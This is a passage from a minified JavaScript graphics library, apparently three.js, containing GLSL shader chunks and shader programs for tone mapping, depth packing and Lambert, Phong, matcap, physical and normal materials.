vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;\n\n\t#endif\n\n#endif\n",specularmap_fragment:"\nfloat specularStrength;\n\n#ifdef USE_SPECULARMAP\n\n\tvec4 texelSpecular = texture2D( specularMap, vUv );\n\tspecularStrength = texelSpecular.r;\n\n#else\n\n\tspecularStrength = 1.0;\n\n#endif\n",specularmap_pars_fragment:"\n#ifdef USE_SPECULARMAP\n\n\tuniform sampler2D specularMap;\n\n#endif\n",tonemapping_fragment:"\n#if defined( TONE_MAPPING )\n\n\tgl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\n\n#endif\n",tonemapping_pars_fragment:"\n#ifndef saturate\n\t#define saturate(a) clamp( a, 0.0, 1.0 )\n#endif\n\nuniform float toneMappingExposure;\nuniform float toneMappingWhitePoint;\n\n// exposure only\nvec3 LinearToneMapping( vec3 color ) {\n\n\treturn toneMappingExposure * color;\n\n}\n\n// source: https://www.cs.utah.edu/~reinhard/cdrom/\nvec3 ReinhardToneMapping( vec3 color ) {\n\n\tcolor *= toneMappingExposure;\n\treturn saturate( color / ( vec3( 1.0 ) + color ) );\n\n}\n\n// source: http://filmicgames.com/archives/75\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\nvec3 Uncharted2ToneMapping( vec3 color ) {\n\n\t// John Hable's filmic operator from Uncharted 2 video game\n\tcolor *= toneMappingExposure;\n\treturn saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\n\n}\n\n// source: http://filmicgames.com/archives/75\nvec3 OptimizedCineonToneMapping( vec3 color ) {\n\n\t// optimized filmic operator by Jim Hejl and Richard Burgess-Dawson\n\tcolor *= toneMappingExposure;\n\tcolor = max( vec3( 0.0 ), color - 0.004 );\n\treturn pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\n\n}\n\n// source: https://knarkowicz.wordpress.com/2016/01/06/aces-filmic-tone-mapping-curve/\nvec3 ACESFilmicToneMapping( vec3 color ) {\n\n\tcolor *= toneMappingExposure;\n\treturn saturate( ( color * ( 2.51 * color + 0.03 ) ) / ( color * ( 2.43 * color + 0.59 ) + 0.14 ) );\n\n}\n",uv_pars_fragment:"\n#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\n\n\tvarying vec2 vUv;\n\n#endif\n",uv_pars_vertex:"\n#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\n\n\tvarying vec2 vUv;\n\tuniform mat3 uvTransform;\n\n#endif\n",uv_vertex:"\n#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\n\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n\n#endif\n",uv2_pars_fragment:"\n#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\n\tvarying vec2 vUv2;\n\n#endif\n",uv2_pars_vertex:"\n#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\n\tattribute vec2 uv2;\n\tvarying vec2 vUv2;\n\n#endif\n",uv2_vertex:"\n#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\n\tvUv2 = uv2;\n\n#endif\n",worldpos_vertex:"\n#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP )\n\n\tvec4 worldPosition = modelMatrix * vec4( transformed, 1.0 );\n\n#endif\n",background_frag:"\nuniform sampler2D t2D;\n\nvarying vec2 vUv;\n\nvoid main() {\n\n\tvec4 texColor = texture2D( t2D, vUv );\n\n\tgl_FragColor = mapTexelToLinear( texColor );\n\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\n}\n",background_vert:"\nvarying vec2 vUv;\nuniform mat3 uvTransform;\n\nvoid main() {\n\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n\n\tgl_Position = vec4( position.xy, 1.0, 1.0 );\n\n}\n",cube_frag:"\nuniform samplerCube tCube;\nuniform float tFlip;\nuniform float opacity;\n\nvarying vec3 vWorldDirection;\n\nvoid main() {\n\n\tvec4 texColor = textureCube( tCube, vec3( tFlip * vWorldDirection.x, vWorldDirection.yz ) );\n\n\tgl_FragColor = mapTexelToLinear( texColor );\n\tgl_FragColor.a *= opacity;\n\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\n}\n",cube_vert:"\nvarying vec3 vWorldDirection;\n\n#include <common>\n\nvoid main() {\n\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\n\tgl_Position.z = gl_Position.w; // set z to camera.far\n\n}\n",depth_frag:"\n#if DEPTH_PACKING == 3200\n\n\tuniform float opacity;\n\n#endif\n\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n\t#include <clipping_planes_fragment>\n\n\tvec4 diffuseColor = vec4( 1.0 );\n\n\t#if DEPTH_PACKING == 3200\n\n\t\tdiffuseColor.a = opacity;\n\n\t#endif\n\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\n\t#include <logdepthbuf_fragment>\n\n\t#if DEPTH_PACKING == 3200\n\n\t\tgl_FragColor = vec4( vec3( 1.0 - gl_FragCoord.z ), opacity );\n\n\t#elif DEPTH_PACKING == 3201\n\n\t\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\n\n\t#endif\n\n}\n",depth_vert:"\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <uv_vertex>\n\n\t#include <skinbase_vertex>\n\n\t#ifdef USE_DISPLACEMENTMAP\n\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\n\t#endif\n\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\n}\n",distanceRGBA_frag:"\n#define DISTANCE\n\nuniform vec3 referencePosition;\nuniform float nearDistance;\nuniform float farDistance;\nvarying vec3 vWorldPosition;\n\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main () {\n\n\t#include <clipping_planes_fragment>\n\n\tvec4 diffuseColor = vec4( 1.0 );\n\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\n\tfloat dist = length( vWorldPosition - referencePosition );\n\tdist = ( dist - nearDistance ) / ( farDistance - nearDistance );\n\tdist = saturate( dist ); // clamp to [ 0, 1 ]\n\n\tgl_FragColor = packDepthToRGBA( dist );\n\n}\n",distanceRGBA_vert:"\n#define DISTANCE\n\nvarying vec3 vWorldPosition;\n\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <uv_vertex>\n\n\t#include <skinbase_vertex>\n\n\t#ifdef USE_DISPLACEMENTMAP\n\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\n\t#endif\n\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\n\tvWorldPosition = worldPosition.xyz;\n\n}\n",equirect_frag:"\nuniform sampler2D tEquirect;\n\nvarying vec3 vWorldDirection;\n\n#include <common>\n\nvoid main() {\n\n\tvec3 direction = normalize( vWorldDirection );\n\n\tvec2 sampleUV;\n\n\tsampleUV.y = asin( clamp( direction.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\n\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\n\n\tvec4 texColor = texture2D( tEquirect, sampleUV );\n\n\tgl_FragColor = mapTexelToLinear( texColor );\n\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\n}\n",equirect_vert:"\nvarying vec3 vWorldDirection;\n\n#include <common>\n\nvoid main() {\n\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\n}\n",linedashed_frag:"\nuniform vec3 diffuse;\nuniform float opacity;\n\nuniform float dashSize;\nuniform float totalSize;\n\nvarying float vLineDistance;\n\n#include <common>\n#include <color_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n\t#include <clipping_planes_fragment>\n\n\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\n\n\t\tdiscard;\n\n\t}\n\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\n\t#include <logdepthbuf_fragment>\n\t#include <color_fragment>\n\n\toutgoingLight = diffuseColor.rgb; // simple shader\n\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\n}\n",linedashed_vert:"\nuniform float scale;\nattribute float lineDistance;\n\nvarying float vLineDistance;\n\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <color_vertex>\n\n\tvLineDistance = scale * lineDistance;\n\n\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\n\tgl_Position = projectionMatrix * mvPosition;\n\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n\n}\n",meshbasic_frag:"\nuniform vec3 diffuse;\nuniform float opacity;\n\n#ifndef FLAT_SHADED\n\n\tvarying vec3 vNormal;\n\n#endif\n\n#include <common>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <envmap_pars_fragment>\n#include <fog_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n\t#include <clipping_planes_fragment>\n\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\n\t// accumulation (baked indirect lighting only)\n\t#ifdef USE_LIGHTMAP\n\n\t\treflectedLight.indirectDiffuse += texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\n\n\t#else\n\n\t\treflectedLight.indirectDiffuse += vec3( 1.0 );\n\n\t#endif\n\n\t// modulation\n\t#include <aomap_fragment>\n\n\treflectedLight.indirectDiffuse *= diffuseColor.rgb;\n\n\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\n\n\t#include <envmap_fragment>\n\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\n}\n",meshbasic_vert:"\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <skinbase_vertex>\n\n\t#ifdef USE_ENVMAP\n\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\n\t#endif\n\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <envmap_vertex>\n\t#include <fog_vertex>\n\n}\n",meshlambert_frag:"\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float opacity;\n\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <fog_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n\t#include <clipping_planes_fragment>\n\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <emissivemap_fragment>\n\n\t// accumulation\n\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\n\n\t#ifdef DOUBLE_SIDED\n\n\t\treflectedLight.indirectDiffuse += ( gl_FrontFacing ) ? vIndirectFront : vIndirectBack;\n\n\t#else\n\n\t\treflectedLight.indirectDiffuse += vIndirectFront;\n\n\t#endif\n\n\t#include <lightmap_fragment>\n\n\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\n\n\t#ifdef DOUBLE_SIDED\n\n\t\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\n\n\t#else\n\n\t\treflectedLight.directDiffuse = vLightFront;\n\n\t#endif\n\n\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\n\n\t// modulation\n\t#include <aomap_fragment>\n\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\n\n\t#include <envmap_fragment>\n\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}\n",meshlambert_vert:"\n#define LAMBERT\n\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <lights_lambert_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}\n",meshmatcap_frag:"\n#define MATCAP\n\nuniform vec3 diffuse;\nuniform float opacity;\nuniform sampler2D matcap;\n\nvarying vec3 vViewPosition;\n\n#ifndef FLAT_SHADED\n\n\tvarying vec3 vNormal;\n\n#endif\n\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n\n#include <fog_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n\t#include <clipping_planes_fragment>\n\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\n\tvec3 viewDir = normalize( vViewPosition );\n\tvec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );\n\tvec3 y = cross( viewDir, x );\n\tvec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5; // 0.495 to remove artifacts caused by undersized matcap disks\n\n\t#ifdef USE_MATCAP\n\n\t\tvec4 matcapColor = texture2D( matcap, uv );\n\t\tmatcapColor = matcapTexelToLinear( matcapColor );\n\n\t#else\n\n\t\tvec4 matcapColor = vec4( 1.0 );\n\n\t#endif\n\n\tvec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;\n\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\n}\n",meshmatcap_vert:"\n#define MATCAP\n\nvarying vec3 vViewPosition;\n\n#ifndef FLAT_SHADED\n\n\tvarying vec3 vNormal;\n\n#endif\n\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <uv_vertex>\n\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\n\t#ifndef FLAT_SHADED // Normal computed with derivatives when FLAT_SHADED\n\n\t\tvNormal = normalize( transformedNormal );\n\n\t#endif\n\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n\n\tvViewPosition = - mvPosition.xyz;\n\n}\n",meshphong_frag:"\n#define PHONG\n\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform vec3 specular;\nuniform float shininess;\nuniform float opacity;\n\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_pars_fragment>\n#include <gradientmap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <lights_phong_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n\t#include <clipping_planes_fragment>\n\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\n\t// accumulation\n\t#include <lights_phong_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\n\t// modulation\n\t#include <aomap_fragment>\n\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\n\t#include <envmap_fragment>\n\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n\n}\n",meshphong_vert:"\n#define PHONG\n\nvarying vec3 vViewPosition;\n\n#ifndef FLAT_SHADED\n\n\tvarying vec3 vNormal;\n\n#endif\n\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\n#ifndef FLAT_SHADED // Normal computed with derivatives when FLAT_SHADED\n\n\tvNormal = normalize( transformedNormal );\n\n#endif\n\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\n\tvViewPosition = - mvPosition.xyz;\n\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n\n}\n",meshphysical_frag:"\n#define PHYSICAL\n\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float roughness;\nuniform float metalness;\nuniform float opacity;\n\n#ifndef STANDARD\n\tuniform float clearCoat;\n\tuniform float clearCoatRoughness;\n#endif\n\nvarying vec3 vViewPosition;\n\n#ifndef FLAT_SHADED\n\n\tvarying vec3 vNormal;\n\n\t#ifdef USE_TANGENT\n\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\n\t#endif\n\n#endif\n\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <bsdfs>\n#include <cube_uv_reflection_fragment>\n#include <envmap_pars_fragment>\n#include <envmap_physical_pars_fragment>\n#include <fog_pars_fragment>\n#include <lights_pars_begin>\n#include <lights_physical_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <roughnessmap_pars_fragment>\n#include <metalnessmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n\t#include <clipping_planes_fragment>\n\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <roughnessmap_fragment>\n\t#include <metalnessmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\n\t// accumulation\n\t#include <lights_physical_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\n\t// modulation\n\t#include <aomap_fragment>\n\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n\n}\n",meshphysical_vert:"\n#define PHYSICAL\n\nvarying vec3 vViewPosition;\n\n#ifndef FLAT_SHADED\n\n\tvarying vec3 vNormal;\n\n\t#ifdef USE_TANGENT\n\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\n\t#endif\n\n#endif\n\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\n#ifndef FLAT_SHADED // Normal computed with derivatives when FLAT_SHADED\n\n\tvNormal = normalize( transformedNormal );\n\n\t#ifdef USE_TANGENT\n\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\n\t#endif\n\n#endif\n\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\n\tvViewPosition = - mvPosition.xyz;\n\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n\n}\n",normal_frag:"\n#define NORMAL\n\nuniform float opacity;\n\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || ( defined( USE_NORMALMAP ) && ! defined( OBJECTSPACE_NORMALMAP ) )\n\n\tvarying vec3 vViewPosition;\n\n#endif\n\n#ifndef FLAT_SHADED\n\n\tvarying vec3 vNormal;\n\n\t#ifdef USE_TANGENT\n\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\n\t#endif\n\n#endif\n\n#include <packing>\n#include <uv_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n\nvoid main() {\n\n\t#include <logdepthbuf_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\n\tgl_FragColor = vec4( packNormalToRGB( normal ), opacity );\n\n}\n",normal_vert:"\n#define NORMAL\n\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || ( defined( USE_NORMALMAP ) && ! defined( OBJECTSPACE_NORMALMAP ) )\n\n\tvarying vec3 vViewPosition;\n\n#endif\n\n#ifndef FLAT_SHADED\n\n\tvarying vec3 vNormal;\n\n\t#ifdef USE_TANGENT\n\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\n\t#endif\n\n#endif\n\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n\nvoid main() {\n\n\t#include 